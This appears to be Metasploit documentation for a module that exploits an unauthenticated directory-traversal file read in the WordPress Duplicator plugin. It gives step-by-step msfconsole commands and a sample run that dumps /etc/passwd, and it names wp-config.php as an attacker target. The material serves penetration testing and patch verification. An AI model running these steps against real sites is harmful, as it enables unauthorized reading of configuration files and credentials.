## Vulnerable Application
The issue is being actively exploited, and allows attackers to download arbitrary files, such as the `wp-config.php` file.
This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin "Duplicator" version 1.3.24-1.3.26,
allowing arbitrary file read with the web server privileges.

Duplicator [Changelog](https://snapcreek.com/duplicator/docs/changelog/)

Vulnerable version: [duplicator.1.3.24.zip](https://downloads.wordpress.org/plugin/duplicator.1.3.24.zip),
[duplicator.1.3.26.zip](https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip)

## Verification Steps

1. Start `msfconsole`
1. `use auxiliary/scanner/http/wp_duplicator_file_read`
1. Set the `RHOSTS`
1. Set the `RPORT`
1. Run the exploit: `run`


## Options

## Scenarios

### Ubuntu 20.04 running WordPress 5.6, Duplicator 1.3.26

```
msf5 > use auxiliary/scanner/http/wp_duplicator_file_read
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rport 8080
rport => 8080
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set FILEPATH /etc/passwd
FILEPATH => /etc/passwd
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set DEPTH 5
DEPTH => 5

msf5 auxiliary(scanner/http/wp_duplicator_file_read) > run

[*] Downloading file...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:110::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
lightdm:x:110:115:Light Display Manager:/var/lib/lightdm:/bin/false
cups-pk-helper:x:111:118:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:113:119::/nonexistent:/bin/false
kernoops:x:114:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:115:121::/var/lib/saned:/usr/sbin/nologin
pulse:x:116:122:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:117:124:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:118:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/var/run/hplip:/bin/false
debian-tor:x:120:126::/var/lib/tor:/bin/false
iodine:x:121:65534::/var/run/iodine:/usr/sbin/nologin
thpot:x:122:65534:Honeypot user,,,:/usr/share/thpot:/dev/null
postfix:x:123:128::/var/spool/postfix:/usr/sbin/nologin
nm-openvpn:x:124:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
statd:x:125:65534::/var/lib/nfs:/usr/sbin/nologin
sshd:x:126:65534::/run/sshd:/usr/sbin/nologin
nm-openconnect:x:127:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
geoclue:x:128:135::/var/lib/geoclue:/usr/sbin/nologin
nxpgsql:x:1001:1001:NeXpose PostgreSQL User:/opt/rapid7/nexpose/nsc/nxpgsql:/bin/sh
mysql:x:129:136:MySQL Server,,,:/nonexistent:/bin/falselsadm:x:999:999:lsadm:/:/sbin/nologin
jenkins:x:131:138:Jenkins,,,:/var/lib/jenkins:/bin/bash
libvirt-qemu:x:64055:139:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
libvirt-dnsmasq:x:132:142:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin
test:x:1002:1003:,,,:/home/test:/bin/bash
ftp:x:133:143:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
gdm:x:134:144:Gnome Display Manager:/var/lib/gdm3:/bin/fals

[+] File saved in: /root/.msf4/loot/20201211005722_default_13.250.118.98_duplicator.trave_383073.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
